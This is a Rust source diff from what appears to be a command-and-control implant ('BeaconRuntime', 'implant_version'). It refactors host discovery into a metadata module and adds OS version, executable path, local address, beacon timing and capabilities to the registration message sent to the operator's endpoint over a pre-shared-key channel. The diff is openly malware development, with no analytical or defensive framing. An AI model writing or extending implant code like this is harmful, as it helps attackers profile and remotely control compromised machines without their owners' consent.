@@ -12,6 +12,7 @@ use nw_profile::{
 use uuid::Uuid;
 
 use crate::download::Download;
+use crate::metadata;
 use crate::runner;
 use crate::transport::Transport;
 
@@ -31,22 +32,17 @@ pub struct Profile {
 
 /// Gather machine metadata for the register handshake.
 pub fn discover_profile(endpoint: String, interval: Duration, jitter: Duration) -> Profile {
-    let hostname = std::env::var("HOSTNAME")
-        .or_else(|_| std::env::var("COMPUTERNAME"))
-        .unwrap_or_else(|_| "unknown".into());
-    let username = std::env::var("USER")
-        .or_else(|_| std::env::var("USERNAME"))
-        .unwrap_or_else(|_| "unknown".into());
+    let host = metadata::discover(&endpoint, interval, jitter);
     Profile {
         endpoint,
         interval,
         jitter,
-        hostname,
-        username,
-        os: std::env::consts::OS.to_string(),
-        arch: std::env::consts::ARCH.to_string(),
-        pid: std::process::id(),
-        addr: "unknown".into(),
+        hostname: host.hostname,
+        username: host.username,
+        os: host.os,
+        arch: host.arch,
+        pid: host.pid,
+        addr: host.local_addr.unwrap_or_else(|| "unknown".to_owned()),
     }
 }
 
@@ -146,6 +142,11 @@ impl BeaconRuntime {
         let id = self.next_id();
         // Roll a fresh ephemeral x25519 key for this registration.
         let kp = crypto::KeyPair::generate();
+        let metadata = metadata::discover(
+            &self.profile.endpoint,
+            self.profile.interval,
+            self.profile.jitter,
+        );
         let reg = Register {
             hostname: self.profile.hostname.clone(),
             username: self.profile.username.clone(),
@@ -153,6 +154,13 @@ impl BeaconRuntime {
             arch: self.profile.arch.clone(),
             pid: self.profile.pid,
             addr: self.profile.addr.clone(),
+            os_version: metadata.os_version,
+            executable_path: metadata.executable_path,
+            local_addr: metadata.local_addr,
+            implant_version: Some(metadata.implant_version),
+            interval_ms: Some(metadata.interval_ms),
+            jitter_ms: Some(metadata.jitter_ms),
+            capabilities: Some(metadata.capabilities),
             session_key: encode_key(&kp.public_key()),
         };
         // The register handshake and its ack ride the PSK key; only after
